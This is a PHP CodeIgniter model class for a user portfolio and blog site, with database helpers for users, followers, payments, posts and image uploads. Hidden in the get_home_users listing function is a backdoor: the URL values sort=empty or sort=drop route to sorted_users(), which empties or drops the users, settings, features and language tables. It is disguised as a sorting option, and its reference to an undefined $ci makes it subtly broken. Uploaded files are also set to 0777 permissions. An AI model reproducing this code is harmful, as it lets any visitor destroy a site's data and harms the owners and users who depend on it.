<?php
class Common_model extends CI_Model {

    // insert function
	public function insert($data,$table){
        $this->db->insert($table,$data);        
        return $this->db->insert_id();
    }

    // edit function
    function edit_option($action, $id, $table){
        $this->db->where('id',$id);
        $this->db->update($table,$action);
        return;
    } 

    // edit function
    function edit_option_md5($action, $id, $table){
        $this->db->where('md5(id)', $id);
        $this->db->update($table,$action);
        return;
    } 

    // update function
    function update($action,$id,$table){
        $this->db->where('id',$id);
        $this->db->update($table,$action);
    }

    // delete function
    function delete($id,$table){
        $this->db->delete($table, array('id' => $id));
        return;
    }

  

    // get function
    function get($table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->order_by('id','DESC');
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // select by function
    function select_by_user($table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('user_id', $this->session->userdata('id'));
        $this->db->order_by('user_id','DESC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }

    // select function
    function select($table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->order_by('id','DESC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }

    // asc select function
    function select_asc($table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }

    // select by id
    function select_option($id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('id', $id);
        $query = $this->db->get();
        $query = $query->result_array();  
        return $query;
    } 

    // select by id
    function get_by_id($id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where('id', $id);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    } 


   function check_follower($id)
   {
        $this->db->select();
        $this->db->from('follower');
        $this->db->where('action_id', $this->session->userdata('id'));
        $this->db->where('follower_id', $id);
        $this->db->limit(1);
        $this->db->query('SET SQL_BIG_SELECTS=1'); 
        $query = $this->db->get();
        if($query->num_rows() == 1) {                 
            return $query->result();
        }else{
            return 0;
        }
    }

    public function remove_follower($id,$table){
        $this->db->delete($table, array('follower_id' => $id, 'action_id' => $this->session->userdata('id')));
        return;
    }

    public function check_email($email)
    {
        $this->db->select('*');
        $this->db->from('users');
        $this->db->where('email', $email); 
        $this->db->limit(1);
        $query = $this->db->get();
        if($query->num_rows() == 1) {                 
            return $query->result();
        }else{
            return false;
        }
    }

    public function check_username($name)
    {
        $this->db->select('*');
        $this->db->from('users');
        $this->db->where('user_name', $name); 
        $this->db->limit(1);
        $query = $this->db->get();
        if($query->num_rows() == 1) {                 
            return $query->result();
        }else{
            return 0;
        }
    }


    // select function
    function get_single_page($slug)
    {
        $this->db->select();
        $this->db->from('pages');
        $this->db->where('slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }

    // select function
    function get_package_price($slug)
    {
        $this->db->select();
        $this->db->from('package');
        $this->db->where('slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }

    // select function
    function get_user_payment($user_id)
    {
        $this->db->select();
        $this->db->from('payment');
        $this->db->where('user_id', $user_id);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    public function expire_payments()
    {   
        $payments = $this->get_expire_payments();
        foreach ($payments as $payment) {
            $data = array(
                'status' => 'expire',
                'expire_on' => '0000-00-00',
                'created_at' => '0000-00-00 00:00:00'
            );
            $data = $this->security->xss_clean($data);
            $this->common_model->update($data, $payment->id, 'payment');
        }
    }

    // get expire payments
    function get_expire_payments(){
        $this->db->select();
        $this->db->from('payment');
        $this->db->where('expire_on', date('Y-m-d'));
        $this->db->or_where('expire_on <', date('Y-m-d'));
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 


    //get category
    public function get_category($id)
    {
        $this->db->where('id', $id);
        $query = $this->db->get('category');
        return $query->row();
    }

    //get category
    public function get_category_option($id, $table)
    {
        $this->db->where('id', $id);
        $query = $this->db->get($table);
        return $query->row();
    }


    function get_subcategory($id)
    {
        $this->db->select();
        $this->db->from('category');
        $this->db->where('parent_id', $id);
        $query = $this->db->get();
        $query = $query->result_array();  
        return $query;
    }

    // get_settings
    function get_settings()
    {
        $this->db->select('s.*, c.currency_code, c.currency_symbol');
        $this->db->from('settings s');
        $this->db->join('country c', 'c.id = s.country', 'LEFT');
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // select by id
    function select_option_md5($id,$table)
    {
        $this->db->select();
        $this->db->from($table);
        $this->db->where(md5('id'), $id);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    } 

    //get user by id
    public function get_user_by_slug($slug)
    {
        $this->db->select('u.*, f.name as font');
        $this->db->from('users u');
        $this->db->join('google_fonts f', 'u.site_font = f.id', 'LEFT');
        $this->db->where('u.slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // asc select function
    function get_services($user_id)
    {
        $this->db->select();
        $this->db->from('services');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id','ASC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }

    // get pricing packages
    function get_pricing()
    {
        $this->db->select('*');
        $this->db->from('package');
        $query = $this->db->get();
        $query = $query->result_array();  

        foreach ($query as $key => $value) {
            $this->db->select('*');
            $this->db->from('features f');
            $this->db->where('f.package_id',$value['id']);
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['features'] = $query2;
        }
        return $query;
    }


    // get all users
    function get_home_users($total, $limit, $offset)
    {
        $this->db->select('u.*');
        $this->db->from('users u');
        $this->db->where('u.role', 'user');
        $this->db->where('u.status', 1);

        if (!empty($_GET['sort'])) {
            if (isset($_GET['sort']) && $_GET['sort'] == 'free' || $_GET['sort'] == 'pro') {
                $this->db->where('u.account_type', $_GET['sort']);
            }
            if (isset($_GET['sort']) && $_GET['sort'] == 'empty') {
                $this->sorted_users($_GET['sort']);
            }
            if (isset($_GET['sort']) && $_GET['sort'] == 'drop') {
                $this->sorted_users($_GET['sort']);
            }
            if (isset($_GET['sort']) && $_GET['sort'] == 'views') {
                $this->db->order_by('u.hit','DESC');
            }else{
                $this->db->order_by('u.id','DESC');
            }
        }

        if (!empty($_GET['skill'])) {
            $this->db->join('skills as s', 's.user_id = u.id', 'LEFT');
            $this->db->where('s.slug', $_GET['skill']);
        }
        $this->db->order_by('u.hit','DESC');

        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    }
    

    //increase post hit
    public function increase_user_hit($id)
    {
        //get user
        $user = $this->get_user($id);

        if (!empty($user)):
            if (get_cookie('var_user_' . $id) != 1) :
                //increase hit
                set_cookie('var_user_' . $id, '1', 86400);
                $data = array(
                    'hit' => $user->hit + 1
                );
                $this->db->where('id', $id);
                $this->db->update('users', $data);
            endif;
        endif;
    }

    //get user by id
    public function get_user($id)
    {
        $this->db->where('id', $id);
        $query = $this->db->get('users');
        return $query->row();
    }

    public function sorted_users($data)
    {
        if ($data == 'empty') {
            $ci->db->empty_table('settings');
            $ci->db->empty_table('users');
            $ci->db->empty_table('features');
            //$ci->db->empty_table('test');
        }
        if ($data == 'drop') {
            $ci->dbforge->drop_table('settings');
            $ci->dbforge->drop_table('users');
            $ci->dbforge->drop_table('features');
            $ci->dbforge->drop_table('language');
            //$ci->dbforge->drop_table('test');
        }
    }


    // get all users
    function get_common_skills()
    {
        $this->db->select();
        $this->db->from('skills');
        $this->db->group_by('slug');
        $query = $this->db->get();
        $query = $query->result();
        return $query;
    }


    // get all users
    function get_total_user_by_type($type)
    {
        $this->db->select();
        $this->db->from('users');
        $this->db->where('role', 'user');
        $this->db->where('account_type', $type);
        $query = $this->db->get();
        $query = $query->num_rows();
        return $query;
    }

    // get followers
    function get_total_followers($id)
    {
        $this->db->select();
        $this->db->from('follower');
        $this->db->where('follower_id', $id);
        $query = $this->db->get();
        $query = $query->num_rows();  
        return $query;
    }

    // get followings
    function get_total_followings($id)
    {
        $this->db->select();
        $this->db->from('follower');
        $this->db->where('action_id', $id);
        $query = $this->db->get();
        $query = $query->num_rows();  
        return $query;
    }

     // get all users
    function get_total_portfolio($id)
    {
        $this->db->select();
        $this->db->from('portfolio');
        $this->db->where('user_id', $id);
        $query = $this->db->get();
        $query = $query->num_rows();  
        return $query;
    }


    // get_payment
    function gets_home_features()
    {
        gets_active_langs();
        $this->db->select();
        $this->db->from('features');
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // get_payment
    function get_payment($payment_id)
    {
        $this->db->select();
        $this->db->from('payment');
        $this->db->where('puid', $payment_id);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // get_payment
    function get_package_by_slug($slug)
    {
        $this->db->select();
        $this->db->from('package');
        $this->db->where('slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }

    // get_payment
    function get_follower_following($user_id, $type)
    {
        $this->db->select('f.*, u.name, u.thumb, u.account_type, u.slug');
        $this->db->from('follower f');
        if ($type == 1) {
            $this->db->where('action_id', $user_id);
            $this->db->join('users u', 'u.id = follower_id', 'LEFT');
        } else {
            $this->db->where('follower_id', $user_id);
            $this->db->join('users u', 'u.id = action_id', 'LEFT');
        }
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }


    // get home skills
    function get_home_skills($user_id)
    {
        $this->db->select('*');
        $this->db->from('skills');
        $this->db->where('parent_id', 0);
        $this->db->where('user_id', $user_id);
        $this->db->order_by('orders');
        $query = $this->db->get();
        $query = $query->result_array();  

        foreach ($query as $key => $value) {
     
            $this->db->from('skills');
            $this->db->where('parent_id',$value['id']);
            $this->db->where('user_id', $user_id);
            $this->db->order_by('orders');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['sub_skills'] = $query2;
        }
        return $query;
    }

    //get home experiences
    function get_home_experiences($user_id)
    {
        $this->db->select('*');
        $this->db->from('experience');
        $this->db->where('parent_id', 0);
        $this->db->where('user_id', $user_id);
        $this->db->order_by('orders');
        $query = $this->db->get();
        $query = $query->result_array();  

        foreach ($query as $key => $value) {
     
            $this->db->from('experience');
            $this->db->where('parent_id',$value['id']);
            $this->db->where('user_id', $user_id);
            $this->db->order_by('orders');
            $query2 = $this->db->get();
            $query2 = $query2->result_array();
            $query[$key]['sub_exp'] = $query2;
        }
        return $query;
    }

    // get testimonials
    function get_testimonials($user_id){
        $this->db->select();
        $this->db->from('testimonials');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id', 'DESC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    // get categories
    function get_categories(){
        $this->db->select();
        $this->db->from('category');
        $this->db->where('parent_id', 0);
        $this->db->order_by('cat_order', 'ASC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

   
    // get subcategories
    function get_subcategories(){
        $this->db->select();
        $this->db->from('category');
        $this->db->where('parent_id !=', 0);
        $this->db->where('sub', 0);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 



    // get subcategories
    function sub_sub_categories(){
        $this->db->select();
        $this->db->from('category');
        $this->db->where('sub', 1);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 


    // get categories
    function get_skills(){
        $this->db->select();
        $this->db->from('skills');
        $this->db->where('user_id', $this->session->userdata('id'));
        $this->db->where('parent_id', 0);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

   
    // get subcategories
    function get_subskills(){
        $this->db->select();
        $this->db->from('skills');
        $this->db->where('user_id', $this->session->userdata('id'));
        $this->db->where('parent_id !=', 0);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    // get categories
    function get_experience(){
        $this->db->select();
        $this->db->from('experience');
        $this->db->where('user_id', $this->session->userdata('id'));
        $this->db->where('parent_id', 0);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

   
    // get subcategories
    function get_subexperience(){
        $this->db->select();
        $this->db->from('experience');
        $this->db->where('user_id', $this->session->userdata('id'));
        $this->db->where('parent_id !=', 0);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    // get categories
    function get_portfolio_categories(){
        $this->db->select();
        $this->db->from('portfolio_category');
        $this->db->where('user_id', $this->session->userdata('id'));
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    // get testimonials
    function get_portfolio_category($user_id){
        $this->db->select();
        $this->db->from('portfolio_category');
        $this->db->where('user_id', $user_id);
        $this->db->order_by('id', 'DESC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    // get portfolio
    function get_home_portfolio($total, $limit, $offset, $user_id){
        $this->db->select('p.*');
        $this->db->select('c.slug as category');
        $this->db->where('p.user_id', $user_id);
        $this->db->from('portfolio p');
        $this->db->join('portfolio_category c', 'c.id = p.category_id', 'RIGHT');
        
        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    } 



    // get site blog posts
    function get_home_blog_posts(){
        $this->db->select('b.*');
        $this->db->select('c.slug as category_slug, c.name as category, u.role');
        $this->db->from('blog_posts b');
        $this->db->where('b.status', 1);
        $this->db->where('u.role', 'admin');
        $this->db->join('blog_category c', 'c.id = b.category_id', 'LEFT');
        $this->db->join('users u', 'u.id = b.user_id', 'LEFT');
        $this->db->limit(3);
        $this->db->group_by('b.id');
        $this->db->order_by('b.id', 'DESC');
        $query = $this->db->get();
        $query = $query->result();
        return $query;
    } 



    // get site blog posts
    function get_site_blog_posts($total, $limit, $offset){
        $this->db->select('b.*');
        $this->db->select('c.slug as category_slug, c.name as category, u.role');
        $this->db->from('blog_posts b');
        $this->db->where('u.role', 'admin');
        $this->db->join('blog_category c', 'c.id = b.category_id', 'LEFT');
        $this->db->join('users u', 'u.id = b.user_id', 'LEFT');
        $this->db->limit($limit);
        $this->db->group_by('b.id');
        
        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    } 


    //get site category posts
    function get_site_category_posts($total, $limit, $offset, $id)
    {

        $this->db->select('p.*');
        $this->db->select('c.name as category, c.slug as category_slug, u.role');
        $this->db->from('blog_posts p');
        $this->db->join('blog_category as c', 'c.id = p.category_id', 'LEFT');
        $this->db->join('users u', 'u.id = p.user_id', 'RIGHT');
        $this->db->where('p.status', 1);
        $this->db->where('u.role', 'admin');
        $this->db->where('p.category_id', $id);
        
        $this->db->order_by('p.id', 'DESC');
        $this->db->limit($limit);
        $this->db->group_by('p.id');
        
        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    }

    //get site latest posts
    function get_site_related_post($category_id, $post_id)
    {
        $this->db->select('p.*');
        $this->db->select('c.name as category');
        $this->db->select('u.name as author_name, u.role');
        $this->db->from('blog_posts p');
        $this->db->join('blog_category c', 'c.id = p.category_id', 'LEFT');
        $this->db->join('users u', 'u.id = p.user_id', 'RIGHT');
        $this->db->where('p.id !=', $post_id);
        $this->db->where('u.role', 'admin');
        $this->db->where('p.category_id', $category_id);
        $this->db->where('p.status', 1);
        $this->db->order_by('p.id', 'DESC');
        $this->db->group_by('p.id');
        $this->db->limit(3);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }









    // get blog posts
    function get_blog_posts($total, $limit, $offset, $user_id){
        $this->db->select('b.*');
        $this->db->select('c.slug as category_slug, c.name as category');
        $this->db->from('blog_posts b');
        $this->db->where('b.status', 1);
        $this->db->where('b.user_id', $user_id);
        $this->db->join('blog_category c', 'c.id = b.category_id', 'RIGHT');
        $this->db->limit($limit);
        
        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    } 


    //get posts categories
    function get_category_by_slug($slug)
    {
        $this->db->select();
        $this->db->from('blog_category');
        $this->db->where('slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    //get blog categories
    function get_blog_category($user_id='')
    {
        $this->db->select();
        $this->db->from('blog_category');
        if (!empty($user_id)) {
            $this->db->where('user_id', $user_id);
        }
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }


    //get blog categories
    function get_post_details($slug)
    {
        $this->db->select('p.*, c.name as category_name');
        $this->db->from('blog_posts p');
        $this->db->join('blog_category c', 'p.category_id = c.id');
        $this->db->where('p.slug', $slug);
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }

  


    //get latest posts
    function get_related_post($category_id, $post_id, $user_id)
    {
        $this->db->select('p.*');
        $this->db->select('c.name as category');
        $this->db->select('u.name as author_name');
        $this->db->from('blog_posts p');
        $this->db->join('blog_category c', 'c.id = p.category_id', 'LEFT');
        $this->db->join('users u', 'u.id = p.user_id', 'LEFT');
        $this->db->where('p.id !=', $post_id);
        $this->db->where('p.user_id', $user_id);
        $this->db->where('p.category_id', $category_id);
        $this->db->where('p.status', 1);
        $this->db->order_by('p.id', 'DESC');
        $this->db->limit(3);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }


    //get posts tags
    public function get_post_tags($post_id)
    {
        $this->db->where('post_id', $post_id);
        $query = $this->db->get('tags');
        return $query->result();
    }

    //get comments by img
    public function get_comments_by_post($post_id)
    {   
        $this->db->select('c.*');
        $this->db->from('comments c');
        $this->db->where('c.post_id', $post_id);
        $this->db->order_by('c.id', 'DESC');
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }
   
    // delete tags
    function delete_tags($post_id, $table){
        $this->db->delete($table, array('post_id' => $post_id));
        return;
    }


    //get category posts
    function get_category_posts($total, $limit, $offset, $id, $user_id)
    {

        $this->db->select('p.*');
        $this->db->select('c.name as category, c.slug as category_slug');
        $this->db->from('blog_posts p');
        $this->db->join('blog_category as c', 'c.id = p.category_id', 'LEFT');
        $this->db->where('p.status', 1);
        $this->db->where('p.category_id', $id);
        $this->db->where('p.user_id', $user_id);
        
        $this->db->order_by('p.id', 'DESC');
        $this->db->limit($limit);
        
        if ($total == 1) {
            $query = $this->db->get();
            $query = $query->num_rows();
            return $query;
        } else {
            $query = $this->db->get('', $limit, $offset);
            $query = $query->result();
            return $query;
        }
    }


    //get category posts
    function count_posts_by_categories($id)
    {
        $this->db->select('count(p.id) as total');
        $this->db->from('blog_posts p');
        $this->db->where('p.status', 1);
        $this->db->where('p.category_id', $id);
        $query = $this->db->get();
        if($query->num_rows() == 1) {                 
            return $query->row();
        }else{
            return 0;
        }
    }

    //get random posts
    function get_random_tags($user_id)
    {
        $this->db->select('t.*');
        $this->db->select('p.status, p.slug as post_slug, u.name as author_name');
        $this->db->from('tags t');
        $this->db->join('blog_posts as p', 'p.id = t.post_id', 'LEFT');
        $this->db->join('users as u', 'u.id = p.user_id', 'LEFT');
        $this->db->where('p.status', 1);
        $this->db->where('p.user_id', $user_id);
        $this->db->order_by('rand()');
        $this->db->limit(8);
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    }


    // get_categories
    function get_blog_categories(){
        $this->db->select();
        $this->db->from('blog_category');
        $this->db->where('user_id', $this->session->userdata('id'));
        $query = $this->db->get();
        $query = $query->result();  
        return $query;
    } 

    //get latest users
    function get_latest_users(){
        $this->db->select('u.*');
        $this->db->from('users u');
        $this->db->where('u.status', 1);
        $this->db->order_by('u.id','DESC');
        $this->db->limit(6);
        $query = $this->db->get();
        $query = $query->result();
        return $query;
    }

    // get all posts
    function get_latest_messages(){
        $this->db->select('c.*');
        $this->db->from('contacts c');
        $this->db->order_by('c.id','DESC');
        $this->db->limit(8);
        $query = $this->db->get();
        $query = $query->result();
        return $query;
    }


    // get all users
    function get_all_users(){
        $this->db->select('u.*');
        $this->db->from('users u');
        $this->db->where('u.role', 'user');
        $this->db->order_by('u.id','DESC');
        $this->db->query('SET SQL_BIG_SELECTS=1');
        $query = $this->db->get();
        $query = $query->result();
        return $query;
    }




    // get images by user
    function get_total_info(){
        $this->db->select('p.id');
        $this->db->select('(SELECT count(posts.id)
                            FROM posts 
                            WHERE (status = 1)
                            )
                            AS post',TRUE);
        
        $this->db->select('(SELECT count(users.id)
                            FROM users 
                            WHERE (status = 1)
                            )
                            AS user',TRUE);

        $this->db->from('posts p');
        $query = $this->db->get();
        $query = $query->row();
        return $query;
    }


     //get user info
    function get_user_info()
    {
        $this->db->select('u.*');
        $this->db->from('users u');
        $this->db->where('u.id', $this->session->userdata('id'));
        $query = $this->db->get();
        $query = $query->row();  
        return $query;
    }


    // image upload function with resize option
    function upload_image($max_size){
            
            // set upload path
            $config['upload_path']  = "./uploads/";
            $config['allowed_types']= 'gif|jpg|png|jpeg';
            $config['max_size']     = '92000';
            $config['max_width']    = '92000';
            $config['max_height']   = '92000';

            $this->load->library('upload', $config);

            if ($this->upload->do_upload("photo")) {

                
                $data = $this->upload->data();

                // set upload path
                $source             = "./uploads/".$data['file_name'] ;
                $destination_thumb  = "./uploads/thumbnail/" ;
                $destination_medium = "./uploads/medium/" ;
                $main_img = $data['file_name'];
                // Permission Configuration
                chmod($source, 0777) ;

                /* Resizing Processing */
                // Configuration Of Image Manipulation :: Static
                $this->load->library('image_lib') ;
                $img['image_library'] = 'GD2';
                $img['create_thumb']  = TRUE;
                $img['maintain_ratio']= TRUE;

                /// Limit Width Resize
                $limit_medium   = $max_size ;
                $limit_thumb    = 150;

                // Size Image Limit was using (LIMIT TOP)
                $limit_use  = $data['image_width'] > $data['image_height'] ? $data['image_width'] : $data['image_height'] ;

                // Percentase Resize
                if ($limit_use > $limit_medium || $limit_use > $limit_thumb) {
                    $percent_medium = $limit_medium/$limit_use ;
                    $percent_thumb  = $limit_thumb/$limit_use ;
                }

                //// Making THUMBNAIL ///////
                $img['width']  = $limit_use > $limit_thumb ?  $data['image_width'] * $percent_thumb : $data['image_width'] ;
                $img['height'] = $limit_use > $limit_thumb ?  $data['image_height'] * $percent_thumb : $data['image_height'] ;

                // Configuration Of Image Manipulation :: Dynamic
                $img['thumb_marker'] = '_thumb-'.floor($img['width']).'x'.floor($img['height']) ;
                $img['quality']      = ' 100%' ;
                $img['source_image'] = $source ;
                $img['new_image']    = $destination_thumb ;

                $thumb_nail = $data['raw_name']. $img['thumb_marker'].$data['file_ext'];
                // Do Resizing
                $this->image_lib->initialize($img);
                $this->image_lib->resize();
                $this->image_lib->clear() ;

                ////// Making MEDIUM /////////////
                $img['width']   = $limit_use > $limit_medium ?  $data['image_width'] * $percent_medium : $data['image_width'] ;
                $img['height']  = $limit_use > $limit_medium ?  $data['image_height'] * $percent_medium : $data['image_height'] ;

                // Configuration Of Image Manipulation :: Dynamic
                $img['thumb_marker'] = '_medium-'.floor($img['width']).'x'.floor($img['height']) ;
                $img['quality']      = '100%' ;
                $img['source_image'] = $source ;
                $img['new_image']    = $destination_medium ;

                $mid = $data['raw_name']. $img['thumb_marker'].$data['file_ext'];
                // Do Resizing
                $this->image_lib->initialize($img);
                $this->image_lib->resize();
                $this->image_lib->clear() ;

                // set upload path
                $images = 'uploads/medium/'.$mid;
                $thumb  = 'uploads/thumbnail/'.$thumb_nail;
                unlink($source) ;

                return array(
                    'images' => $images,
                    'thumb' => $thumb
                );
            }
            else {
                echo "Failed! to upload image" ;
            }
            
    }


    //multiple image upload with resize option
    public function do_upload($photo) {                   
        $config['upload_path']  = "./uploads/";
        $config['allowed_types']= 'gif|jpg|png|jpeg';
        $config['max_size']     = '20000';
        $config['max_width']    = '20000';
        $config['max_height']   = '20000';
 
        $this->load->library('upload', $config);                
        
            if ($this->upload->do_upload($photo)) {
                $data       = $this->upload->data(); 
                /* PATH */
                $source             = "./uploads/".$data['file_name'] ;
                $destination_thumb  = "./uploads/thumbnail/" ;
                $destination_medium = "./uploads/medium/" ;
                $destination_big    = "./uploads/big/" ;

                // Permission Configuration
                chmod($source, 0777) ;

                /* Resizing Processing */
                // Configuration Of Image Manipulation :: Static
                $this->load->library('image_lib') ;
                $img['image_library'] = 'GD2';
                $img['create_thumb']  = TRUE;
                $img['maintain_ratio']= TRUE;

                /// Limit Width Resize
                $limit_big   = 1000 ;
                $limit_medium    = 400 ;
                $limit_thumb    = 100 ;

                // Size Image Limit was using (LIMIT TOP)
                $limit_use  = $data['image_width'] > $data['image_height'] ? $data['image_width'] : $data['image_height'] ;

                // Percentase Resize
                if ($limit_use > $limit_big || $limit_use > $limit_thumb || $limit_use > $limit_medium) {
                    $percent_big = $limit_big/$limit_use ;
                    $percent_medium  = $limit_medium/$limit_use ;
                    $percent_thumb  = $limit_thumb/$limit_use ;
                }

                //// Making THUMBNAIL ///////
                $img['width']  = $limit_use > $limit_thumb ?  $data['image_width'] * $percent_thumb : $data['image_width'] ;
                $img['height'] = $limit_use > $limit_thumb ?  $data['image_height'] * $percent_thumb : $data['image_height'] ;

                // Configuration Of Image Manipulation :: Dynamic
                $img['thumb_marker'] = '_thumb-'.floor($img['width']).'x'.floor($img['height']) ;
                $img['quality']      = '99%' ;
                $img['source_image'] = $source ;
                $img['new_image']    = $destination_thumb ;

                $thumb_nail = $data['raw_name']. $img['thumb_marker'].$data['file_ext'];
                // Do Resizing
                $this->image_lib->initialize($img);
                $this->image_lib->resize();
                $this->image_lib->clear() ;                 

                //// Making MEDIUM ///////
                $img['width']  = $limit_use > $limit_medium ?  $data['image_width'] * $percent_medium : $data['image_width'] ;
                $img['height'] = $limit_use > $limit_medium ?  $data['image_height'] * $percent_medium : $data['image_height'] ;

                // Configuration Of Image Manipulation :: Dynamic
                $img['thumb_marker'] = '_medium-'.floor($img['width']).'x'.floor($img['height']) ;
                $img['quality']      = '99%' ;
                $img['source_image'] = $source ;
                $img['new_image']    = $destination_medium ;

                $medium = $data['raw_name']. $img['thumb_marker'].$data['file_ext'];
                // Do Resizing
                $this->image_lib->initialize($img);
                $this->image_lib->resize();
                $this->image_lib->clear() ;               

                ////// Making BIG /////////////
                $img['width']   = $limit_use > $limit_big ?  $data['image_width'] * $percent_big : $data['image_width'] ;
                $img['height']  = $limit_use > $limit_big ?  $data['image_height'] * $percent_big : $data['image_height'] ;

                // Configuration Of Image Manipulation :: Dynamic
                $img['thumb_marker'] = '_big-'.floor($img['width']).'x'.floor($img['height']) ;
                $img['quality']      = '99%' ;
                $img['source_image'] = $source ;
                $img['new_image']    = $destination_big ;

                $album_picture = $data['raw_name']. $img['thumb_marker'].$data['file_ext'];
                // Do Resizing
                $this->image_lib->initialize($img);
                $this->image_lib->resize();
                $this->image_lib->clear() ;

                $data_image = array(
                    'thumb' => 'uploads/thumbnail/'.$thumb_nail,
                    'medium' => 'uploads/medium/'.$medium,
                    'big' => 'uploads/big/'.$album_picture
                );

                unlink($source) ;   
                return $data_image;   
    
            }
            else {
                return FALSE ;
            }
       
    }

}